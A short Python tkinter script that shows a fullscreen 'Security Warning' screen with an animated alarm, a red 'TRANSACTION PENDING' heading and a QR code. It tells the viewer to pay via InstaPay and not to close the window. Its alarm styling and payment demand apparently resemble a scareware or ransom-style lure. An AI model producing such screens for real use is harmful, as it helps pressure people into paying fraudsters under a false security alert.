import tkinter as tk
from tkinter import font
from PIL import Image, ImageTk

def load_gif_frames(path):
    """Extracts all frames from a GIF file and returns them as a list."""
    frames = []
    i = 0
    while True:
        try:
            frame = tk.PhotoImage(file=path, format=f"gif -index {i}")
            frames.append(frame)
            i += 1
        except tk.TclError:
            break
    return frames

def animate_gif(root, label, frames, delay, current_idx=0):
    """Updates the label with the next frame in the list."""
    if not frames:
        return
    
    label.config(image=frames[current_idx])
    next_idx = (current_idx + 1) % len(frames)
    root.after(delay, animate_gif, root, label, frames, delay, next_idx)

def exit_fullscreen(event, root):
    """Exits the application when the Escape key is pressed."""
    root.destroy()

def create_warning_ui():
    # 1. Setup Main Window 
    root = tk.Tk()
    root.title("Action Required - Security Warning")
    
    # Enable Fullscreen
    root.attributes('-fullscreen', True)
    root.configure(bg="#ffffff")
    
    # Bind the Escape key to close the window (important for fullscreen apps!)
    root.bind("<Escape>", lambda event: exit_fullscreen(event, root))

    # 2. Create Left and Right Layout Frames (expand to fill the screen)
    left_frame = tk.Frame(root, bg="#ffffff")
    left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=50, pady=50)

    right_frame = tk.Frame(root, bg="#ffffff")
    right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=50, pady=50)

    # 3. LEFT SIDE: Alarm GIF and Warning Text
    alarm_label = tk.Label(left_frame, bg="#ffffff")
    # Using expand=True to center the content vertically
    alarm_label.pack(pady=(10, 5), expand=True, anchor="s") 
    
    try:
        frames = load_gif_frames("alarm.gif")
        if frames:
            alarm_label.frames = frames 
            animate_gif(root, alarm_label, frames, delay=80)
    except Exception as e:
        print(f"Error loading alarm.gif: {e}")

    # Increased font sizes for fullscreen visibility
    title_font = font.Font(family="Helvetica", size=36, weight="bold")
    title_label = tk.Label(left_frame, text="TRANSACTION PENDING", font=title_font, fg="#d32f2f", bg="#ffffff")
    title_label.pack(pady=20)

    msg_text = (
        "Please scan the InstaPay QR code\n"
        "to complete your secure transfer.\n\n"
        "Do not close this window until the\n"
        "payment is confirmed."
    )
    msg_label = tk.Label(left_frame, text=msg_text, font=("Helvetica", 20), bg="#ffffff", justify="center")
    msg_label.pack(pady=10, expand=True, anchor="n")


    # 4. RIGHT SIDE: QR Code Display
    try:
        # Increased QR code size for fullscreen
        qr_image = Image.open("qr.jpeg")
        qr_image = qr_image.resize((450, 450), Image.Resampling.LANCZOS)
        qr_photo = ImageTk.PhotoImage(qr_image)
        
        qr_label = tk.Label(right_frame, image=qr_photo, bg="#ffffff")
        qr_label.image = qr_photo  # Maintain memory reference
        qr_label.pack(expand=True) # Center it in the right frame
    except Exception as e:
        print(f"Error loading qr.jpeg: {e}")
        error_label = tk.Label(right_frame, text="[ QR Code Missing ]", font=("Helvetica", 24), fg="red", bg="white")
        error_label.pack(expand=True)

    # 5. Run the Application
    root.mainloop()

if __name__ == "__main__":
    create_warning_ui()